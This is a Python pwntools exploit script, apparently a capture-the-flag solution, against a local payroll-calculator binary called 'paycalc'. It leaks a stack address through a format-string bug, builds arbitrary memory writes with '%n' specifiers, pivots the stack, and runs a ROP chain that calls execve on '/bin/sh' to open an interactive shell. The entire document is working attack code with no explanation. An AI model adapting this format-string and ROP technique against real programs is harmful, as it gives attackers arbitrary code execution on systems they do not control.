#!/usr/bin/python3
from pwn import process, p64

shell = process("./paycalc")

rop  = b""
rop += p64(0x401d93)  # pop rdi; ret;
rop += p64(0x6c7080)  # .data
rop += p64(0x43e345)  # pop rdx; ret;
rop += b"/bin/sh\x00" # string to write
rop += p64(0x400b0a)  # mov qword ptr [rdi], rdx; ret;
rop += p64(0x43e369)  # pop rdx; pop rsi; ret;
rop += p64(0x0) * 2   # NULL
rop += p64(0x4721d8)  # pop rax; ret;
rop += p64(0x3b)      # execve()
rop += p64(0x462275)  # syscall

def exploit(payload, username=b"username", end=False):
	payload += p64(0x6cab2c)
	payload += rop
	shell.sendlineafter(b"NAME: ", username)
	shell.sendlineafter(b"WORKED: ", b"41")
	shell.sendlineafter(b"OVERTIME: ", payload)
	shell.recvuntil(b"REASON:\n")
	data = shell.recvline()
	shell.sendlineafter(b"(Y/N):", b"Y")

	if not end:
                shell.sendlineafter(b"\n", b"")
                shell.recvlines(2)
	else:
                shell.recv()

	return data


def write(what, where, end=False):
	lwhere = b""
	lwhere += p64(where)
	ba = bytearray(p64(where))
	for i in range(8):
		ba[0] += 1
		lwhere += ba

	bs = bytearray(p64(what))
	lwhat = [0] * 8
	marker = 0

	for i in range(8):
		if i == 0:
			lwhat[i] = bs[0] + 0x100
			continue

		v = bs[i] - bs[i-1]

		if v == 0 and marker == 0:
 			marker = 1

		if marker > 0:
			v = marker + 0xff

		v += 0x100
		lwhat[i] = v

	buffer = b""

	for i in range(8):
		buffer += b"%" + str(6).encode()
		buffer += b"$" + str(lwhat[i]).encode()
		buffer += b"lx%" + str(6+i).encode()
		buffer += b"$n"

	exploit(buffer, lwhere, end)

leak = int(exploit(b"%26$p")[:14], 16)

exit = leak - 0x13b
rbp = leak - 0xe8

write(0x4004e4, rbp + 8)  # pop rsp; ret;
write(0x6cab2c, rbp + 16) # rop addr

write(0x0, exit, True)
shell.interactive()
